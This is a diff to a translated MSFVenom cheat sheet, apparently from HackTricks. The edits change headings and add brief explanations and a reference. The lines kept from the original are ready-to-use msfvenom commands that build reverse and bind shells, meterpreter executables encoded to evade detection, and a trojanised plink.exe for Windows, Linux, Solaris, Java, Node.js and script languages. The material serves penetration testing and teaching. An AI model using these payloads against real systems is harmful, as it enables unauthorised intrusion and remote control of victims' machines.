@@ -1,20 +1,20 @@
-# MSFVenom - 速查表
-
-{{#include ../../banners/hacktricks-training.md}}
+# MSFVenom - CheatSheet
 
 ---
 
-## 基础 msfvenom
+## Basic msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-也可以使用 `-a` 指定 architecture，或使用 `--platform`
+使用 `-a` 选择 payload 架构，使用 `--platform` 选择其目标平台。<sup>[[1]](#references)</sup>
 
 ## 列表
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
+这些命令会列出已安装 framework 中可用的 payload 和 encoder 模块。<sup>[[1]](#references)</sup>
+
 ## 创建 shellcode 时的常用参数
 ```bash
 -b "\x00\x0a\x0d"
@@ -23,6 +23,8 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
+此处显示的 flags 用于选择 bad characters、输出格式、encoder 和 encoding iterations。<sup>[[1]](#references)</sup>
+
 ## **Windows**
 
 ### **Reverse Shell**
@@ -50,7 +52,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### 嵌入在可执行文件中
+### 嵌入可执行文件内部
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
@@ -65,7 +67,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```bash
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
 ```
-### SunOS（Solaris）
+### SunOS (Solaris)
 ```bash
 msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
 ```
@@ -111,7 +113,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Script Language payloads**
+## **脚本语言 payloads**
 
 ### **Perl**
 ```bash
@@ -125,4 +127,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw 
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
+## References
+
+- [1] [如何使用 msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
 {{#include ../../banners/hacktricks-training.md}}
